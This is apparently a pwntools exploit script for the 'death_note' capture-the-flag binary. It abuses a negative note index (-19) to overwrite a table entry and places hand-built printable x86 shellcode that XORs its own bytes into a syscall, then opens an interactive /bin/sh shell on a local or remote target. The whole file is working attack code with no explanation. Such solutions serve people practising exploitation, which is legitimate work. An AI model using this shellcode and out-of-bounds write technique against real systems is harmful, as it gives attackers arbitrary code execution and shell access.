#/usr/env/bin python
#-*- coding: utf-8 -*-
from pwn import *
import sys
import pwn

def add(Index,Name):
    io.sendlineafter('Your choice :',str(1))
    io.sendlineafter('Index :',str(Index))
    io.sendlineafter('Name :',Name)
    io.recvuntil('Done !\n')

def show(Index):
    io.sendlineafter('Your choice :',str(2))
    io.sendlineafter('Index :',str(Index))

def delete(Index):
    io.sendlineafter('Your choice :',str(3))
    io.sendlineafter('Index :',str(Index))

def exploit(flag):
    add(0,"xingxing")
    delete(0)
    shellcode = asm(
    '''
    pop ebp;
    pop ebx;
    push 0x7e;
    pop eax;
    inc eax;
    inc eax;
    xor [ebx+0x2a],eax;
    xor [ebx+0x2b],eax;
    push ecx;
    pop eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    inc eax;
    ''')
    
    shellcode += "M"
    add(0, "/bin/sh\x00")
    #gdb.attach(io,"b *0x8048872")
    add(-19, shellcode)
    delete(0)
    io.interactive()

if __name__ == "__main__":
    context.binary = "./death_note"
    context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./death_note')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc=ELF('./libc.so.6')
        exploit(0)
    else:
        io = process('./death_note',env={'LD_PRELOAD:':'./libc.so.6'})
        libc = ELF('./libc.so.6')
        exploit(1)

